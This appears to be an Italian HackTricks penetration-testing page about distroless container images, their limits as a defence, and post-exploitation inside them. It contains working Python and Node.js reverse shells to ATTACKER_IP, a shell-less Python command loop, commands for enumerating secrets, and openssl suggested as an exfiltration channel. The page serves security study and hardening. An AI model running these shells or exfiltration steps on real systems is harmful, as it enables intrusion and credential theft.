# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Un'immagine container **distroless** è un'immagine che include i **componenti runtime minimi necessari per eseguire una specifica applicazione**, rimuovendo intenzionalmente gli strumenti tipici delle distribuzioni come package manager, shell e ampie raccolte di utility generiche dell'userland. In pratica, le immagini distroless spesso contengono solo il binario o il runtime dell'applicazione, le sue librerie condivise, i bundle di certificati e una struttura di filesystem molto ridotta.

Il punto non è che distroless sia una nuova primitiva di isolamento del kernel. Distroless è una **strategia di progettazione dell'immagine**. Modifica ciò che è disponibile **all'interno** del filesystem del container, non il modo in cui il kernel isola il container. Questa distinzione conta, perché distroless indurisce l'ambiente principalmente riducendo ciò che un attaccante può usare dopo aver ottenuto l'esecuzione di codice. Non sostituisce namespaces, seccomp, capabilities, AppArmor, SELinux o qualsiasi altro meccanismo di isolamento a runtime.

## Perché esistono le immagini distroless

Le immagini distroless sono usate principalmente per ridurre:

- le dimensioni dell'immagine
- la complessità operativa dell'immagine
- il numero di pacchetti e binari che potrebbero contenere vulnerabilità
- il numero di strumenti di post-exploitation disponibili a un attaccante di default

Per questo le immagini distroless sono popolari nelle distribuzioni di applicazioni in produzione. Un container che non contiene shell, né package manager e quasi nessun tooling generico è solitamente più semplice da gestire operativamente e più difficile da abusare in modo interattivo dopo una compromissione.

Esempi di famiglie di immagini in stile distroless ben note includono:

- le immagini distroless di Google
- Chainguard hardened/minimal images

## Cosa non significa distroless

Un container distroless **non** è:

- automaticamente rootless
- automaticamente non-privileged
- automaticamente read-only
- automaticamente protetto da seccomp, AppArmor o SELinux
- automaticamente sicuro da container escape

È comunque possibile eseguire un'immagine distroless con `--privileged`, con condivisione di namespace host, mount pericolosi o con lo socket del runtime montato. In quello scenario l'immagine può essere minimale, ma il container può comunque essere catastroficamente insicuro. Distroless cambia la **superficie d'attacco userland**, non il **confine di fiducia del kernel**.

## Caratteristiche operative tipiche

Quando comprometti un container distroless, la prima cosa che di solito noti è che le assunzioni comuni smettono di essere vere. Potrebbe non esserci `sh`, né `bash`, né `ls`, né `id`, né `cat`, e talvolta neanche un ambiente basato su libc che si comporti come la tua solita tradecraft si aspetta. Questo influisce sia sull'offense che sulla defense, perché la mancanza di tooling rende debugging, incident response e post-exploitation differenti.

I modelli più comuni sono:

- il runtime dell'applicazione esiste, ma poco altro
- i payload basati su shell falliscono perché non c'è una shell
- i one-liner comuni per l'enumerazione falliscono perché i binari di supporto mancano
- spesso sono presenti anche protezioni del filesystem come rootfs in sola lettura o `noexec` su posizioni tmpfs scrivibili

Questa combinazione è ciò che di solito porta le persone a parlare di "weaponizing distroless".

## Distroless e post-exploitation

La sfida offensiva principale in un ambiente distroless non è sempre l'RCE iniziale. Spesso è ciò che viene dopo. Se il workload sfruttato fornisce esecuzione di codice in un runtime di linguaggio come Python, Node.js, Java o Go, potresti essere in grado di eseguire logica arbitraria, ma non attraverso i normali workflow centrati sulla shell che sono comuni in altri target Linux.

Questo significa che la post-exploitation spesso si sposta in una di tre direzioni:

1. **Usare direttamente il runtime del linguaggio esistente** per enumerare l'ambiente, aprire socket, leggere file o preparare payload aggiuntivi.
2. **Caricare i propri strumenti in memoria** se il filesystem è in sola lettura o le posizioni scrivibili sono montate con `noexec`.
3. **Abusare dei binari già presenti nell'immagine** se l'applicazione o le sue dipendenze includono qualcosa inaspettatamente utile.

## Abuso

### Enumerare il runtime che hai già

In molti container distroless non c'è una shell, ma c'è ancora un runtime dell'applicazione. Se il target è un servizio Python, Python è presente. Se il target è Node.js, Node è presente. Questo spesso fornisce funzionalità sufficienti per enumerare file, leggere variabili d'ambiente, aprire reverse shells e predisporre esecuzione in memoria senza mai invocare `/bin/sh`.

Un semplice esempio con Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Un semplice esempio con Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impatto:

- recupero delle variabili d'ambiente, spesso comprese credenziali o endpoint di servizio
- enumerazione del filesystem senza `/bin/ls`
- identificazione di percorsi scrivibili e dei segreti montati

### Reverse Shell senza `/bin/sh`

Se l'immagine non contiene `sh` o `bash`, una reverse shell classica basata su shell potrebbe fallire immediatamente. In tal caso, usa invece il runtime del linguaggio installato.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Se `/bin/sh` non esiste, sostituire l'ultima riga con l'esecuzione diretta di comandi tramite Python o con un ciclo REPL di Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Ancora una volta, se `/bin/sh` è assente, usa direttamente le API filesystem, process e networking di Node invece di avviare una shell.

### Esempio completo: loop di comandi Python senza shell

Se l'immagine ha Python ma nessuna shell, un semplice loop interattivo è spesso sufficiente per mantenere la piena capacità di post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Questo non richiede un interactive shell binary. L'impatto è effettivamente lo stesso di una shell di base dal punto di vista dell'attaccante: esecuzione di comandi, enumerazione e staging di ulteriori payload tramite il runtime esistente.

### Esecuzione di strumenti in memoria

Le immagini distroless sono spesso combinate con:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Questa combinazione rende inaffidabili i workflow classici di "download binary to disk and run it". In questi casi, le tecniche di esecuzione in memoria diventano la soluzione principale.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binari già presenti nell'immagine

Alcune immagini distroless contengono ancora binari necessari per l'operatività che diventano utili dopo il compromesso. Un esempio osservato ripetutamente è `openssl`, perché le applicazioni a volte ne hanno bisogno per operazioni crypto o correlate a TLS.

Un rapido pattern di ricerca è:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Se `openssl` è presente, potrebbe essere utilizzabile per:

- connessioni TLS in uscita
- data exfiltration su un canale di egress consentito
- staging di payload tramite encoded/encrypted blobs

L'abuso esatto dipende da ciò che è effettivamente installato, ma l'idea generale è che distroless non significa "nessun strumento in assoluto"; significa "molto meno strumenti rispetto a un'immagine di distribuzione normale".

## Controlli

L'obiettivo di questi controlli è determinare se l'immagine è realmente distroless nella pratica e quali runtime o helper binaries sono ancora disponibili per il post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Ciò che è interessante qui:

- Se non esiste una shell ma è presente un runtime come Python o Node, la post-exploitation dovrebbe orientarsi all'esecuzione guidata dal runtime.
- Se il filesystem root è in sola lettura e `/dev/shm` è scrivibile ma `noexec`, le tecniche di esecuzione in memoria diventano molto più rilevanti.
- Se sono presenti binari di supporto come `openssl`, `busybox` o `java`, potrebbero fornire funzionalità sufficienti per ottenere accesso aggiuntivo.

## Impostazioni predefinite del runtime

| Stile immagine / piattaforma | Stato predefinito | Comportamento tipico | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Google distroless style images | Userland minimale per progettazione | Nessuna shell, nessun gestore di pacchetti, solo dipendenze dell'applicazione/runtime | aggiunta di layer di debugging, shell sidecar, copia di busybox o di altri strumenti |
| Chainguard minimal images | Userland minimale per progettazione | Superficie di pacchetti ridotta, spesso focalizzata su un singolo runtime o servizio | uso di `:latest-dev` o varianti di debug, copia di strumenti durante la build |
| Kubernetes workloads using distroless images | Dipende dalla configurazione del Pod | Distroless influisce solo sull'userland; la postura di sicurezza del Pod dipende ancora dalla specifica del Pod e dalle impostazioni predefinite del runtime | aggiunta di container di debug effimeri, mount host, impostazioni di Pod privilegiato |
| Docker / Podman running distroless images | Dipende dai flag di esecuzione | Filesystem minimale, ma la sicurezza a runtime dipende ancora dai flag e dalla configurazione del daemon | `--privileged`, condivisione del namespace host, mount dei socket del runtime, bind host scrivibili |

Il punto chiave è che distroless è una **proprietà dell'immagine**, non una protezione a runtime. Il suo valore deriva dal ridurre ciò che è disponibile all'interno del filesystem dopo una compromissione.

## Pagine correlate

Per bypass del filesystem e dell'esecuzione in memoria comunemente necessari negli ambienti distroless:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Per abuso del runtime del container, socket e mount che si applicano ancora ai workload distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
